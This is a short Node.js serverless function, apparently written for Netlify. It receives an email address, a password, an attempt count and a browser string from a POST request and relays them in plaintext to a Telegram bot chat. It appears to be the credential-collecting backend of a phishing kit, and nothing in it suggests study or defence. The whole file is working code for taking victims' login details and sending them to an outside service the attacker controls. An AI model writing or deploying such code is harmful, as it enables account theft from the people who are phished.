const fetch = require('node-fetch');

exports.handler = async (event) => {
  // Only allow POST requests
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }

  try {
    const { email, password, attempt, userAgent } = JSON.parse(event.body);

    // Get secrets from Netlify Environment Variables
    const TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const message = `
🔔 **New Login Attempt**
📧 Email: ${email}
🔑 Password: ${password}
🌐 Browser: ${userAgent}
🔢 Attempt: ${attempt}
    `;

    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    if (response.ok) {
      return { statusCode: 200, body: JSON.stringify({ status: "success" }) };
    } else {
      throw new Error("Telegram API failed");
    }
  } catch (error) {
    return { statusCode: 500, body: JSON.stringify({ error: error.message }) };
  }
};
